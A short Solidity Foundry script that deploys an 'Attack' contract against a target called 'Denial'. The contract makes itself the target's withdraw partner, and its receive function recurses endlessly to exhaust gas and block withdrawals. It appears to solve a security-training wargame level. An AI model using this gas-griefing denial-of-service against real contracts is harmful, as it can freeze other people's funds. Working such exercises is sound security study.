// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Denial.sol";

contract DenialScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        Attack a = new Attack();
        a.a();

        vm.stopBroadcast();
    }
}

contract Attack {
    Denial target;
    
    function a() public {
        target = Denial(payable(0x74406305802De4e224A33D86a65aeF121C8B2F7A));
        target.setWithdrawPartner(address(this));
    }

    function b() public {
        c();
    }

    function c() public {
        b();
    }

    receive() external payable {
        b();
    }
    
}